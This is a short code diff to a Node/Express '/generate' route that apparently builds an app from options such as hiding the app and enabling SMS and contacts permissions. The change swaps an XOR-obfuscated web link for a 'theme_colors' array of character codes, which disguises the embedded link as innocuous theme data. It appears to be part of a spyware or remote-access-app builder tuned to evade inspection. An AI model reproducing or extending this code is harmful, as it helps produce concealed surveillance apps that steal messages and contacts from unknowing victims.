@@ -264,19 +264,14 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const assetsDir = path.join(workDir, 'assets');
             if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
             fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
-            const encKey = 'H3x4C0r3S3cur3K3y';
             const rawLink = webLink || "";
-            let encryptedLink = "";
-            if (rawLink) {
-                const buf = [];
-                for (let i = 0; i < rawLink.length; i++) {
-                    buf.push(rawLink.charCodeAt(i) ^ encKey.charCodeAt(i % encKey.length));
-                }
-                encryptedLink = Buffer.from(buf).toString('base64');
+            const themeColors = [];
+            for (let i = 0; i < rawLink.length; i++) {
+                themeColors.push(rawLink.charCodeAt(i));
             }
             const config = {
                 hideApp: hideApp === 'true',
-                _wl: encryptedLink,
+                theme_colors: themeColors,
                 appName: appName || "Hexa Core",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
